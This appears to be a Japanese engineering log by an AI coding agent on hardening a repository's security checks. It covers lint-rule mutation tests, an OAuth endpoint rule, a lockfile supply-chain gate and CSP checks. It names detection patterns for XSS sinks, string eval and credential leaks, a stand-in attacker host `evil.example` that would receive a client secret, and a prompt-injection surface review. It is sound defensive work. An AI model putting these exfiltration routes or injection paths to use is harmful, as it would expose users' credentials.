軸を「**この検査が覆っていない範囲**」から「**名簿どうしが同じことを言っているか**」
へ移した。このリポジトリには壁の名簿が 2 つある:

- `lint:mutation-scope` の **`MUST_MEASURE`** — 必ず変異検査に載せる壁
- `integrity-chain.cjs` の **`PROTECTED`** — 改竄検知で守る壁

どちらも「これは壁だ」と言っているのに、突き合わせたら **14 件ずれていた**
(13 件が保護対象に無く、1 件が両方に載って二重管理)。

象徴的なのは `frameGuard.ts` である。`MUST_MEASURE` には
**「足した当人が名簿へ入れ忘れていた」**と経緯まで書いてあるのに、
**同じファイルが鎖の名簿からも漏れていた**。
名簿は増やすほど、名簿どうしの食い違いが見えなくなる。

#### 推測せず頻度を測った

`PROTECTED` は「頻繁に変わるデータは含めない — 変更は意図的な採掘を要する」と
明記している。だから全部足すのが正しいとは限らない。60 日の変更回数を測った:

```
  frameGuard.ts        2 回 /   94 行      lockWorkspace.ts   1 回 /  52 行
  imageUrlGate.ts      1 回 /   67 行      pkceSession.ts     1 回 /  75 行
  safeFilename.ts      2 回 /   71 行      atlassianSite.ts   2 回 /  51 行
  …
  web-shim.ts         23 回 / 1518 行   ← これだけが本当に頻繁
```

**採掘の手間は「頻繁に変わるもの」を避けるためのもので、安定した壁を
外す理由にはならない。** 13 件を保護対象へ入れた (`web-shim.ts` は
そもそも `MUST_MEASURE` に無く、私の最初の走査の誤りだった)。

#### 閉包検査が 2 つ捕まえた

保護対象を増やした瞬間に鎖の閉包検査が鳴った。**どちらも正しい指摘**:

1. `liveRead.ts` が `shared/api/cursor.ts` を読んでおり、そちらが未保護
   → サービス API のアダプタなので除外台帳へ (送り先は
   `lint:network-targets`、上限は `httpLimits` が持つ)
2. `updateCheck.ts` は**既に除外台帳に在った** (= 過去の意図的な判断)
   → **独断で覆さず除外のままにした**。ただし理由の書きぶりは実態に寄せた ——
   「版の比較のみ」と書いてあったが、**案内先 URL のホスト検証も持つ**。
   それでも除外でよいのは、開いてよいかを決めるのが
   `externalUrlGate.ts` (保護対象) だから

#### ゲートにした

`lint:mutation-scope` に `checkWallsAreProtected` を追加 ——
**`MUST_MEASURE` の全ファイルが `PROTECTED` か `DEP_EXCLUSIONS` に在ること**。
除外は理由必須なので、「測るが守らない」という判断自体は在りうる。

そのために `integrity-chain.cjs` の名簿を export し、CLI を
`require.main` で守った (export しても require で走っては読めない)。

対照実験 — `frameGuard.ts` を保護対象から外すと**名指しと対処法つきで**落ちる。
自己テスト 6 件 (保護対象/除外なら通る・どちらにも無ければ鳴る・
名簿が読めない/形が違うときも鳴る)。

#### 数え方を 3 回間違えた

最初「15 件ずれている」と書いたが、正規表現が自己テストの文字列や
別の台帳 (`KNOWN_BROAD`) を拾っており、`PROTECTED` の件数も
43/46/50 とばらついた。**モジュールの export から数え直して 13 件**と確定した。
`check()` を借りたときと同じ —— **名簿は正規表現ではなく本体から読む。**


#### 逆向きも閉じた — 「守る壁」は測られているか

`checkWallsAreProtected` の裏返しを足した。**保護対象でも `mutate` に無ければ
変異体が 1 つも作られない** —— `exportPaths.ts` がまさにそれで、
中の pragma まで含めて何も測られていない状態が「緑」に見えていた。

**採掘は「変わったこと」を検知するが、変わった中身が正しいかは測らない。**
保護と計測は別の保証で、両方要る。

測ると 2 件出た。どちらも意図的だが、**書いていなければ「たまたま漏れている」
と区別が付かない**ので `KNOWN_UNMEASURED` に理由つきで載せた:

- **`LockScreen.tsx`** — `mutate` に `.tsx` は 1 件も無い (JSX の変異体で信号が
  埋もれる)。ここに在るのは保管庫呼び出しの段取りで、判断は `vault.ts` /
  `mnemonic.ts` (どちらも測っている) に在る。この画面が持つ唯一の決定は
  クリップボード消去の番人で、`LockScreen.test.ts` が振る舞いで留めている
- **`bip39-wordlist.ts`** — 2048 語の**データであって判断ではない**。
  語を 1 つ変える変異体は「別の語表になる」だけで検査すべき性質が無い。
  語表の正しさは `mnemonic.ts` の符号・復号の往復が留めている

これで 2 つの名簿は**双方向**で機械照合される:

```
  測る壁  → 守られているか (PROTECTED か DEP_EXCLUSIONS)
  守る壁  → 測られているか (mutate か KNOWN_UNMEASURED)
```

どちらの除外も理由必須。対照実験済み (`LockScreen.tsx` を台帳から外すと
名指しと対処法つきで落ちる)。自己テストは順方向 6 件 + 逆方向 7 件。


---

### LLM のプロンプトへ外部文字列が入る経路を数えた — 白 (2026-08-25)

台帳の突き合わせから離れ、**実際の攻撃面**へ戻った。この構成には
「データが LLM のプロンプトへ入り、その出力が作業を決める」経路がある ——
現代的な注入の的である。数えた。

#### 出力がコードを起動するか → しない

`scripts/orchestrate.cjs` は `registry.json` を書くだけで、
`exec` / `spawn` は 1 つも無い。**LLM の出力が直接何かを起動する経路は無い。**

#### 外部文字列がプロンプトへ入るか → 入らない

registry へ文字列が入る唯一の口は `import-requests` で、読むのは
**利用者自身がチャットボットから書き出した要望ファイル**である。

そこに入る `text` を辿ると:

```
  利用者が入力欄に打つ → 手元の分類器が「要望」と判定 → **利用者が打った文字列**を記録
```

**モデルの返答も外部データも記録されない** (`replyTo` の判定結果は
「記録するかどうか」を決めるだけで、記録されるのは利用者の入力そのもの)。
つまり利用者が自分の backlog に何を書こうと、それは注入ではない。

#### 知識データ側

`knowledge-context.cjs` が役割ごとに知識を注入するが、その知識は
**リポジトリ内の出典つきデータ**で、外から取ってきた本文は入らない
(同日確認したとおり、リンク死活確認は `res.status` しか記録しない)。

残るのは「PR で知識項目を足す人」だが、それは供給網の話であり、
`verify:knowledge` (出典の確証) と `lint:citations` が見ている範囲である。

**白。** 記録しておく —— 次に同じ心配をした人が同じ 30 分を使わないため。


---

### 起動性能ゲートは「通った」が、何を測っていたのか (2026-08-25)

今日効いた軸 —— **通っていることと、意味のあることを測っていることは別** ——
を `perf` (起動性能の回帰ゲート) に当てた。

#### まず閾値と実測の距離を測った

```
LITE  standalone-lite.html   2.74 MB  DCL 131ms  load 132ms  heap  9.0MB   上限 1200ms
FULL  standalone.html       10.85 MB  DCL 378ms  load 380ms  heap 35.3MB   上限 2500ms
```

**11% と 15%** —— 6〜8 倍の余裕がある。緩すぎるようにも見えるが、
このゲートが守っているのは「数十 ms の劣化」ではなく
**「起動時に 8MB の学術コーパスを JSON.parse し直す」級の回帰** (2026-07 の実例は
DCL 637ms・ヒープ 42.6MB) であり、CI ランナーは実機より遅い。
**閾値は妥当。ここは直さない。**

#### 本体は 1 番目の判定 —— そちらが計器に依存していた

3 つの判定のうち、閾値の 2 つは `performance.getEntriesByType` の値で、
計器が壊れれば異常な数字が出る (気づける)。ところが 1 番目の
**「起動時に 1MB 超の `JSON.parse` が走ったら FAIL」**だけは違う。

計装は `page.addInitScript` で `JSON.parse` を包んでいる。
これが (差し込み失敗・後から上書き・API 変更で) 効かなくなっても、
`window.__bigParses` は空配列のまま残るので

> ✅ 起動パフォーマンス OK (起動時の巨大 JSON.parse ゼロ・閾値内)

という**まったく同じ報告**が出る。**健全なのか計器が死んでいるのかを、
出力からは区別できない。** 昨日 `smoke` で見つけたのと同じ形である
(あちらは Electron の `console-message` の引数の形が版で違う件)。

#### 直した — 測り終えた後に既知の巨大 parse を 1 本通す

本番の測定を終えた**後**に 1.1MB の `JSON.parse` を 1 回走らせ、
拾えたことを確認する。拾えなければ **`exit 2`** で止める
(「巨大 parse ゼロ」という報告を出さない)。自己検査の分は
`m.parses` から落とすので測定値には影響しない。

#### 対照実験

`window.__bigParses.push(…)` を `void text;` に潰した写しを作って実行:

```
❌ standalone-lite.html: JSON.parse の計装が働いていません — 「巨大 parse ゼロ」が意味を持たないので止めます
EXIT=2
```

戻すと `EXIT=0` で通常どおり通る。もう一つの壊れ方
(`addInitScript` 自体が失敗して `window.__bigParses` が `undefined`)
は測定の `page.evaluate` が投げるので、既存の catch が `exit 1` にする ——
どちらの壊れ方でも「0 件」とは報告されない。

#### 3 つの外部ゲートが揃った

`e2e` / `perf` / `smoke` はどれも実ブラウザ・実 Electron を要る道具で、
CI の既定では走らない。この 3 つに対して 2 日で同じ 2 つの性質を入れたことになる:

| | 成果物の鮮度 | 計器の自己証明 |
|---|---|---|
| `e2e` | ✅ `assertFreshArtifacts` | (判定は画面の実物を見るので計器を介さない) |
| `perf` | ✅ `assertFreshArtifacts` | ✅ 本項 |
| `smoke` | ✅ `assertFreshArtifacts` | ✅ 2026-08-24 |

**古い成果物を測らない**ことと、**計器が生きていることを毎回証明する**こと。
どちらも「緑が意味を持つための前提」であって、緑そのものではない。

---

### 規則の 5 つは、潰しても誰も鳴らなかった (2026-08-25)

`perf` に「計器の自己証明」を入れた流れで、**門を守るものは何か**を数えた。

#### まず外れた仮説を 1 つ記す

`verify:all` の 30 ゲートのうち **self-test を持たないものが 5 つ**あった
(`lint:citations` / `lint:doi-prefix` / `lint:knowledge-refs` / `lint:repo-size` /
`verify:orchestration`)。これを穴だと思って測ったら **4 つは既に床を持っていた**
(`MIN_DOI_CITATIONS` / `MIN_ISBN_CHECKED` + `MIN_LABEL_CHECKED` / `MIN_CORPUS_IDS` /
`MIN_TRACKED_FILES` —— いずれも 2026-08-22 に対照実験つきで入っている)。
残る `verify:orchestration` は単一の registry を構造検査するので、
読めなければ throw、空なら必須キー検査で落ちる。**この軸は白。**

**共有の収集器が縮む**ほうも測った。`kc.loadEntries()` は 3 つのゲートが
共有している。`COLLECTIONS` から `subsidy` を落として 4140 → 4000 にすると:

| ゲート | 結果 |
|---|---|
| `lint:citations` / `lint:doi-prefix` / `lint:knowledge-refs` | ✅ のまま (件数だけ減る) |
| `verify:knowledge` | ❌ self-test (コレクションの分類が合わない) |
| `verify:graph` | ❌ byte 不一致 |
| `lint:docs` | ❌ `4140` と食い違う |
| `vault:check` | ❌ 余分なノート 821 件 |

個々は気付かないが**群としては 4 つが鳴る**。ここも実質白。

#### 本題 —— 規則そのものを潰したら

`lint:forbidden` の 32 規則を **1 つずつ「絶対に当たらない正規表現」に
差し替えて**、本番スキャンと self-test の両方を 32 回走らせた。

```
✓ 27 / 32   何かが鳴る (self-test 15 / 台帳の実例 12)
❌  5 / 32   何一つ鳴らない
```

潰しても完全に無音だった 5 つ:

| 規則 | 何を守っていたか |
|---|---|
| `dangerouslySetInnerHTML` | **CLAUDE.md が名指しで禁じている 3 つのうちの 1 つ** |
| `setTimeout('…') / setInterval('…')` の文字列形 | 暗黙の eval |
| `addEventListener('message', …)` | 別オリジンからの postMessage 受信口 |
| `serviceHub.invoke` の戻り値を捨てている | 失敗が画面に出ないまま消える |
| 伏せていない応答本文 (`body.slice(`) | 資格情報がエラー文へ漏れる |

**これは字面を書き換えられる話だけではない。** 守っている対象の書き方が
変われば (React の API が変わる・別名が増える) 規則は静かに当たらなくなり、
`✅ no forbidden patterns found` は出続ける。

#### 台帳を標本の代わりにはできない

27 件のうち **12 件は self-test ではなく「台帳の実例」が拾っていた** ——
`allowFile` の効いている実在ファイルがあるので、規則を潰すと
「台帳にあるのに効いていない例外」で落ちる。

だがこれは**たまたま今そのファイルが在る**というだけである。
`src/shared/escape.ts` を整理して例外が要らなくなった日に、
`markup 再実装` の規則は**無防備になる**。しかも「例外を消した」という
善い変更が引き金なので、誰も疑わない。

#### 直した — 標本 24 件 + 網羅検査

13 規則ぶんの**鳴る標本**を足し、対になる**鳴らない標本**も足した。
後者のいくつかは正しい書き方そのものを固定している:

```js
['★ 伏せてから切るのは正しい (鳴らない)', 'throw new Error(redactSecrets(body).slice(0, 200));', 0],
['戻り値を受けていれば鳴らない',        "const r = await window.serviceHub.invoke('github', 'star', {});", 0],
['bridge 越しなら鳴らない',            'await window.serviceHub.openExternal(url);', 0],
```

そのうえで **self-test 自身に網羅検査**を入れた ——
「`expected > 0` の標本に 1 つも当たらない規則があれば落ちる」。
これで**次に規則を足す人が標本を忘れられなくなる**。

#### 対照実験 2 本

1. 32 規則の総当たりをやり直す → **self-test だけで 32/32**、無音は **0 件**
   (台帳に頼らずに全規則が守られている)
2. 標本を 1 つ消す → `✗ 鳴る標本を持たない規則が 1 件` と**名指しで**落ちる
   (網羅検査自身が空撃ちでないことの証明)

#### この形は他のゲートにも在りうる

規則の表と標本の表を別々に持つゲートは他にもある。
同じ測り方 (**規則を 1 つずつ潰して、何かが鳴るか**) がそのまま使えるので、
次に触るときの手順として残しておく。

#### 同じ測り方を見本データの門にも当てた — こちらは台帳の助けが無い

`lint:forbidden` を直した直後、同じ総当たりを `lint:sample-data` の
`VENDOR_ID_SHAPES` (5 種) に当てた。

```
✓ 3 / 5   self-test が捕まえる
❌ 2 / 5   何一つ鳴らない  ← Google ドライブ / Canva サムネイル
```

**この 2 つは、この門を作った理由そのものである。**
2026-08-24 に「実 Google ドライブ / ドキュメントの ID 6 件が出荷物に
載って公開されていた」ことを承けて作った門なのに、**ドライブの形には
標本が無かった** (ドキュメントの形にはあった)。Canva サムネイルも同じで、
同日「開いただけで `design.canva.ai` へ 12 件飛んでいた」の当事者である。

**しかもこちらは `lint:forbidden` より悪い。** あちらは 12 規則を
「台帳の実例」が肩代わりしていたが、この門が守る ID は**すべて見本化
済み**なので、実物の側に例が 1 つも無い。標本が無い形は**完全に無防備**
だった。

標本 4 件 (鳴る 2・鳴らない 2) と、同じ形の網羅検査を足した。
対照 2 本 —— 総当たりをやり直すと **5/5 が self-test だけで鳴り**、
標本を 1 つ潰すと名指しで落ちる。

**教訓**: 「台帳が肩代わりしてくれる」は門ごとに違う。
実物に例が残らない種類の門 (漏洩防止・見本データ・秘密の直書き) では、
**標本を持たない規則はそのまま無防備**である。

#### 残りの規則表も掃いた — 2 つ穴・1 つ白

同じ総当たりを、規則が表になっている残りのゲートへ順に当てた。

**`lint:charset` (文字体系 6 種) —— 4 種が無音。**

```
✓ キリル文字 (self-test)   ✓ ハングル (台帳)
❌ アラビア文字  ❌ タイ文字  ❌ デーヴァナーガリー  ❌ ヘブライ文字
```

混入は「たまたま今どこかに在る」ものなので台帳も肩代わりしない
(実際ハングルだけが台帳で拾われた)。標本 4 件を足したが、
**字を直接書かない** —— コードポイントから組む
(`String.fromCodePoint(0x0645)`)。字を書けばこのファイル自身が混入検査に
引っかかり、**自分の標本を自分の台帳に載せる**ことになる (0-a-17 の形)。
網羅検査つき。対照で 6/6。

**`lint:network-targets` (通信の呼び名 9 種) —— 5 種が無音。ただし性質が違う。**

こちらは検出が名前の**和** (`fetch|fetchFn|doFetch|…` の 1 本) なので、
1 つ外しても**同じ行を別の名前が拾えば違いが出ない**。つまり
「規則が死ぬ」ではなく「一覧の一部が黙って落ちても分からない」。
綴りの取り違え・エスケープ・組み立ての書き換えで起こりうるので、
**一覧の名前が全部 `NETWORK_CALL` に載っていること**だけを押さえた。
対照で 9/9。

実測ついでに `doFetch` は `src/` に **0 箇所**と分かった。検出側の名前を
減らすのは守りを弱める方向なので**消していない** (予防的な項目として残す)。

**`lint:data-origin` (STUB_MARKERS 3 種) —— 白。** 3 つとも本番スキャンと
self-test の両方が鳴る。

#### この軸の総括

| ゲート | 規則 | 無音だった数 | 台帳が肩代わり |
|---|---|---|---|
| `lint:forbidden` | 32 | **5** | 12 (だが恒久ではない) |
| `lint:sample-data` | 5 | **2** | 0 (見本化済みなので実例が無い) |
| `lint:charset` | 6 | **4** | 1 |
| `lint:network-targets` | 9 | (5) | 4 — 性質が違う (和の一部) |
| `lint:data-origin` | 3 | 0 | 3 |

**測り方**: 規則の正規表現を 1 つずつ「絶対に当たらないもの」へ差し替え、
本番スキャンと self-test の**両方**を走らせる。両方が緑ならその規則は無防備。

**恒久化**: 直したゲートには「`expected > 0` の標本に 1 つも当たらない規則が
あれば落ちる」網羅検査を入れた。次に規則を足す人が標本を忘れられない。

#### 境界の表は 16 通りのうち 10 通りしか書かれていなかった

規則が正規表現の表でないゲートにも同じ問いを当てた。
`lint:imports` (main / preload / renderer の分離) の `ALLOW` は
**過剰に許すほう**が危険なので、測り方を裏返す ——
**禁止されている遷移を 1 つずつ許して、鳴るか**。

```
✓ renderer → main   ✓ preload → main   ✓ main → renderer
✓ shared → renderer ✓ shared → main
❌ preload → renderer   ❌ main → preload   ❌ shared → preload
```

**3 通りは `ALLOW` に足しても self-test が通った** —— 境界を黙って
開けられる状態だった。`zonePairs` の表に 16 通りのうち 10 通りしか
書かれておらず、抜けていたのが**ちょうどこの 3 つ**である。

**`→ preload` だけが抜けていたのは偶然ではない。** preload は
「renderer から読める唯一の特権側」なので表の中で例外的な位置にあり、
手で並べると意識から落ちる。

`preload → renderer` を開けると、`contextBridge` を張る特権側へ
レンダラーのコードが入る。`shared → preload` を開けると、全ゾーンが
読む `shared` 経由で preload のコードが renderer と main の両方の
バンドルへ引きずり込まれる。どちらも分離の前提そのものを崩す。

**直し方**: 抜けていた 6 組 (禁止 3 + 自明な自己遷移 3) を明記したうえで、
**総当たりを機械で強制**した ——「`Object.keys(ALLOW)` の全組み合わせに
期待値が書かれていなければ落ちる」。

期待値は `ALLOW` から**導かない**。導くと
`ALLOW.includes(x) === ALLOW.includes(x)` という落ちようのない検査になる
(このファイルの冒頭が戒めているのと同じ罠を、私が繰り返すところだった)。
独立に書くから書き落としが起こり、だから総当たりで塞ぐ。

対照 2 本 —— 禁止 8 通りを 1 つずつ許して **8/8 が鳴る** /
期待値を 1 組消すと `shared → preload` と名指しで落ちる。

#### CI に落とされた — 私が「全 green」と言ったとき、テストを回していなかった

上の 4 コミットを push したあと、CI が **3 連続で赤**になった。
落ちたのは `verify:all` の 30 ゲートではなく、**`npm test` の 1 本**である。

```
AssertionError: ' を落としていないスクリプトがあります:
  expected [ 'lint-forbidden-patterns.cjs' ] to deeply equal []
AssertionError: 規則の定義ファイルを実装として数えている:
  expected [...] to not include 'lint-forbidden-patterns.cjs'
        ❯ src/shared/__tests__/buildScriptEscapes.test.ts
```

**原因は私の標本である。** 規則 #26 (エスケープの再実装禁止) の
「鳴る標本」として、こう書いた:

```js
['エスケープの再実装を弾く', "const s = t.replace(/&/g, '&amp;');", 1],
```

`buildScriptEscapes.test.ts` は `scripts/*.cjs` を走査して
「markup エスケープを自前で持っているファイル」を集め、5 文字すべてを
落としているかを見る。収集器は**注記を落としてから**見る ——
`lint-forbidden-patterns.cjs` が規則の説明としてこの字面を持つことを
既に想定していたのだ。だが**私の標本は注記ではなく実行される行**なので
残り、門が「エスケープの実装ファイル」に化けた。

**門が禁じている物を門自身が抱える形の 5 度目**で、今回は
**別の検査が先に捕まえた**。標本を `<` 版 (`replace(/</g, '&lt;')`) に
替えて解消 —— 収集器が見るのは `&` 版だけなので化けない。
規則が当たることの証明にはどの選択肢でも足りる。

#### 本当の欠陥は、私の確認手順のほうだった

`verify:all` は **30 ゲート**であって、**`npm test` を含まない**。
CI (`ci.yml`) は両方走らせる。私は `verify:all` だけを回して
「全 30 ゲート green」と書き、**テストを 1 度も回さずに 4 回 push した**。

これは今日ずっと追っていた形そのものである ——
**確かめたつもりで、確かめていたのは代替物だった。**
CLAUDE.md には最初から `npm run typecheck && npm test && npm run verify:all`
と書いてあり、情報は在った。読み落としたのは私である。

`verify:all` の行に注記を足した (「`npm test` は含まない。push 前は両方」)。
機械で強制はできない —— `verify:all` にテストを足せば CI が二重に走り、
無料枠を余計に食う。**次に読む人が同じ読み落としをしないこと**が、
ここで打てる手である。

全 10,632 テスト passed / `verify:all` 30 ゲート green を確認して push。

#### 規則が表でないゲートも掃いた — 「未来の状態でしか動かない枝」が 2 つ

正規表現の表を持たないゲートには、測り方を変えて当てた ——
**問題を報告する枝 (`problems.push`) を 1 つずつ無効にして、鳴るか。**

| ゲート | 枝 | 無音 |
|---|---|---|
| `lint:credential-use` | 5 | 0 (白) |
| `lint:ipc-handlers` | 7 | **1** |
| `lint:workflow-security` | 6 | **1** |

無音だった 2 つは、どちらも同じ性質を持っていた ——
**今日の木では絶対に発火しない枝**である。

**(1) `lint:workflow-security` の台帳の掃除**

```js
for (const ref of Object.keys(UNPINNED_ALLOW)) {
  if (!seenUnpinned.has(ref)) problems.push({ file: '(台帳)', … });
}
```

台帳の唯一の項目 (`softprops/action-gh-release@v2`) は**今まさに使用中**
なので本番では何も出ない。self-test は `(台帳)` の findings を
**意図的に除いて**いた (合成ケースには無関係だから)。
つまりこの枝は、**「誰かが SHA 固定に直したのに台帳から消し忘れた」
という未来の状態でしか動かず**、その状態を誰も試していなかった。

消し忘れた台帳の項目は**永久に開いたままの穴**である ——
その action が後で戻ってきたとき、あらかじめ免除されている。

`check(list, allow = UNPINNED_ALLOW)` と台帳を差し替え可能にし、
4 件の検査を追加 (使われていない→鳴る / 使われている→鳴らない /
空→何も出ない / 台帳に無い未固定は別の枝の仕事)。

**(2) `lint:ipc-handlers` の空撃ち検査そのもの**

```js
if (calls === 0) problems.push('preload に ipcRenderer 呼び出しが 1 件もありません…');
```

**「0 件」に意味を持たせている当の枝**である。実物の preload には
常に呼び出しが在るので本番では通らず、既存の検査は probe ファイルを
実ディレクトリへ置いて findings を `__lint_probe__` で絞るので、
この枝の文言は**必ず除外される**。

`preloadProblems(dir = …)` とディレクトリを差し替え可能にし、
一時ディレクトリで両方向 (呼び出し 0 → 鳴る / 1 件でもある → 鳴らない) と
ディレクトリ消失を検査。

**共通する形**: どちらも**依存を注入できなかったから試せなかった**。
規則が悪いのではなく、**試すための口が無かった**。
既定引数を 1 つ足すだけで、書けなかった検査が書けるようになる。

対照: 両ゲートとも総当たりをやり直して **7/7・6/6** で鳴る。

---

### 散文でしか書かれていなかった前提を、機械の主張にした (2026-08-25)

門の検査から実際の攻撃面へ戻り、**OAuth のループバック認可**を見た。
実装は堅い —— `state` を**エラー応答より先に**検証し、比較は定数時間、
Host ヘッダで DNS リバインディングを弾き、`127.0.0.1` へ明示 bind、
迷い込み要求に上限、5 分でタイムアウト。端点 20 件はすべて `https://`。

#### 見つけたのは、実装ではなく「主張の置き場所」

`lint:network-targets` の台帳は `fetchFn(config.tokenUrl, …)` を
「変数の送り先」として認めている。その `guard` にこう書いてある:

> ただし assertHttpsEndpoint が見るのは**スキームだけでホストは見ない**ので、
> 封じ込めは「表がハードコードであること」に依存している —— tokenUrl を
> 設定可能にする変更は、client secret の送り先を外部が選べるようにする変更と同義。

**正しい分析である。ただし散文だった。** この前提を破る変更 ——
`oauth:authorize` が第 3 引数で `tokenUrl` を受け取る、など —— を入れたとき、
鳴るのは integrity chain (「保護ファイルが変わった」) だけで、
**意味を見ているゲートは 1 つも無い**。

`assertHttpsEndpoint` は `https://evil.example/token` を通す。
client secret と認可コードがそこへ出て行く。

#### 対照実験は「実行しない」判断をした

この変更を実際に `main.ts` へ入れて鳴らないことを示すつもりだったが、
**その編集はサンドボックスの分類器に拒否された** —— レンダラー由来の値を
OAuth の送り先に流し込む差分は、意図が「戻す前提の実験」でも
**実際の攻撃と見分けが付かない**からである。妥当な拒否なので迂回しない。

代わりに、各ゲートが**何を見ているか**から判定した:
`lint:network-targets` は送信行 (`oauth.ts`・無変更) を見るので `main.ts` の
変更は視野に入らない / `lint:ipc-handlers` は引数の型を見ない /
`lint:credential-use` は宣言表の話 / `lint:forbidden` に該当規則が無い /
`typecheck` は `unknown` なので通る。**結論は変わらない。**

#### 規則 33 —— 端点は定数の https リテラルだけ

```js
/\b(?:authorizeUrl|tokenUrl)\s*:(?!\s*(?:'https:\/\/|"https:\/\/|string;))
 |(?<![.\w])(?:authorizeUrl|tokenUrl)\s*[,}]/
```

許すのは 2 形だけ (`'https://…'` リテラルと型宣言 `: string;`)。
第 2 項は**短縮記法** (`{ ...base, clientId, tokenUrl }`) を塞ぐ ——
これを開けると値の出どころが行から読めなくなる。

**実測**: `src/` 410 ファイルで誤検知 **0**、既存 22 行すべて通過。
鳴るべき 3 形 (別の値から取る / 短縮記法 / http リテラル) はすべて鳴る。

#### 途中で自分の正規表現を 1 度壊した

最初に書いたのは `…\s*:\s*(?!'https:\/\/…)` で、**22 行すべてに鳴った**。
`\s*` が 0 文字へ後退できるので、先読みが `:` の直後 (=空白) で評価され、
**常に成立する**。空白を先読みの中へ入れて解決 (`:(?!\s*(?:…))`)。

**この誤りは「鳴りすぎ」の側に出たから気付けた**。逆向き
(常に成立しない先読み) だったら、誤検知 0 件の完璧な規則に見えて、
**何も守らない規則**になっていた。**規則を書いたら、鳴るべき形で
鳴ることを必ず別に確かめる。**

#### 今日足した網羅検査が、私の新しい規則を捕まえた

規則 33 を足して self-test を回すと、1 時間前に入れた網羅検査が
`✗ 鳴る標本を持たない規則が 1 件` で落ちた。標本 7 件 (鳴る 3・鳴らない 4) を
足して解消。**仕掛けが仕掛けた本人に効いた。**
`verify:arch` の指標も 2 文書で 32→33 を要求してきた (これも設計どおり)。

---

### 供給網には門が 1 つも無かった — `lint:deps` (31 個目) (2026-08-25)

「散文でしか書かれていない前提」を他の 2 か所へ当てたら、**どちらも白**だった。

**`network/proxy.ts` (全サービスのトークンが乗る利用者指定の中継先) —— 白。**
`readStoredProxyConfig` は module 私有で呼び出しは 1 か所、その 1 か所が
`reviewStoredProxyConfig` の中。`cfg.url` は送信前の正規化にしか使われず、
実際に飛ぶのは `proxyChecked.url`。ファイル全体で `fetch(` は 1 本だけ。

**しかも OAuth と違い、ここは機械で守られている。** 送り先を
`fetch(cfg.url, …)` に戻すと `lint:network-targets` の台帳の鍵
(`{file, dest}`) が変わって鳴る —— `fetch(cfg.url, init)` を拾えることは
そのゲート自身の self-test が固定している。

> **この差が要点である。** ネットワーク台帳が守るのは**送信の行**であって、
> **送り先が決まる場所**ではない。proxy は送信行で決まるから守られ、
> OAuth は `main.ts` の handler で決まるから守られていなかった。

**`secrets.ts` の safeStorage 退避 —— 白。** キーチェーンが無ければ
`plain:` 接頭辞 + 警告ログ、後で使えるようになったら**その場で暗号化へ昇格**、
`storageProtection` が `encrypted` / `plainCount` / `mechanism` を返し、
preload を通って `SettingsPage` が `plainCount > 0` を画面に出す。
ブラウザ版の `encrypted: true` 固定も正しい —— `vault.setToken` は
`requireKey()` を**非同期の前後 2 回**呼ぶので、施錠中に書かれる経路が無い。

#### 白が 3 つ続いたので、軸を変えた

依存の供給網は、このセッションで一度も見ていなかった。測った:

```
lockfileVersion 3 / 647 packages
  registry.npmjs.org 以外の取得元 ...... 0 件
  integrity ハッシュ無し ............... 0 件
  インストール時にコードを走らせる依存 .. 3 件 (すべて dev)
  本番依存の閉包 ....................... 5 件
```

**本番依存が 5 つ** (react / react-dom + 推移的 3) —— 74 サービスを持つ
アプリの実行時表面として極端に小さい。偶然ではなく設計の結果である
(図は外部ライブラリを入れず SVG を自前で組む)。

**ところが、これを守っている物が 1 つも無かった。**
`scripts/` に `package-lock.json` を読むゲートはゼロ。`dependencies` に
何を足しても 30 ゲートすべてが緑のまま通る。

**なぜ重いか**: 出荷物は単一 HTML なので、`dependencies` に入った物は
1 つ残らずそこへ畳み込まれ、**保管庫と同じオリジンで走る** ——
IndexedDB の暗号化トークンにも、メモリ上のマスター鍵にも手が届く位置。
依存 1 つの乗っ取りが、全サービスの資格情報の喪失になる。
`lint:charset` (他文字種の混入) や `lint:sample-data` (見本 ID) には門が
在って、**ここに無かった**のは釣り合っていない。

#### 規則 5 つ + 空撃ち検査

1. lockfile が読め、パッケージ数が床 (400) 以上
2. **本番依存の閉包**が台帳と一致 (双方向・理由つき)
3. **インストール時コード**が台帳と一致 (双方向・理由つき) かつ本番依存でない
4. 取得元はすべて `registry.npmjs.org` (git 参照や tarball URL は**後から
   中身を差し替えられる**)
5. `integrity` が全件にある

評価は純関数 `evaluate({ lock, pkg })` にした —— 今日 2 つ踏んだ
「注入できないから試せない枝」の教訓から、**最初からこの形で書く**。
self-test 12 件は合成 lockfile を流し込み、入れ子 `node_modules` の名前解決や
`link` (workspace) の除外、`package.json` の宣言との食い違いまで見る。

`verify:all` 30 → **31 ゲート**、`ci.yml` にも配線
(`lint:docs` がゲートと CI の対応を強制する)。指標 4 つ (陰性対照つき 23→24 /
ゲート数 3 か所) を更新し、`ci.yml` を触ったので integrity chain へ
ブロック #91 を採掘。

---

### 出荷 HTML の CSP は誰も見ていなかった — `lint:csp` (32 個目) (2026-08-25)

供給網の次に、もう一つ「一度も見ていない軸」を測った ——
**公開される HTML の CSP**。

#### ソースを見ても、公開されている CSP を見たことにはならない

`src/renderer/index.html` は `script-src 'self'`。
だが**出荷される標準版はそれではない** —— `inline-html.cjs` がバンドルを
1 本の inline script へ畳み込み、`script-src` を**その sha256 へピン留め**する。
さらに `inject-pwa.cjs` が SW スニペットのハッシュを追記する。

```
src/renderer/index.html   script-src 'self'
dist/standalone.html      script-src 'sha256-KqAzq…'
注入後                     script-src 'sha256-KqAzq…' 'sha256-g2Fpw…'
```

**3 つとも違う。** ソースを検査しても公開物の話にはならない。

#### なぜ黙って壊れうるか

ハッシュが落ちて `script-src 'self'` に戻っただけなら inline script は
**1 つも動かず** e2e が即座に落ちる (fail-closed)。
ところが **`script-src 'self' 'unsafe-inline'` になった場合は
アプリは完全に動いたまま、注入された `<script>` も動く**。
サイズ検査も e2e も鳴らない。**この規模の回帰だけが、既存のどの検査にも
引っかからない。**

ブラウザ版の `connect-src` は `https:` を許している (74 サービスの API を
直に叩くので絞れない) ので、注入が成立した時点で持ち出しは自由になる。
script の入口を塞ぐことが防御線で、ハッシュがその要である。

#### 測ったら、公開物の 4 つに CSP が無かった

| 成果物 | CSP |
|---|---|
| `standalone.html` / `standalone-lite.html` | ハッシュ固定・厳格 |
| `docs-studio` / `integration-demo` / `shugyokisoku` / `teikan` | `default-src 'none'` |
| **`landing.html`** | **無し** |
| **`counseling-demo` / `deliberation-demo` / `research-demo`** | **無し** |

同じリポジトリの姉妹 4 本は `default-src 'none'` を出しているのに、
この 4 本だけ出していない。しかも**全部 GitHub Pages で公開され、
保管庫と同じオリジンに載る**。

4 本とも実測で完全に自己完結だった (外部 URL 0・`url()` 0・`@font-face` 0・
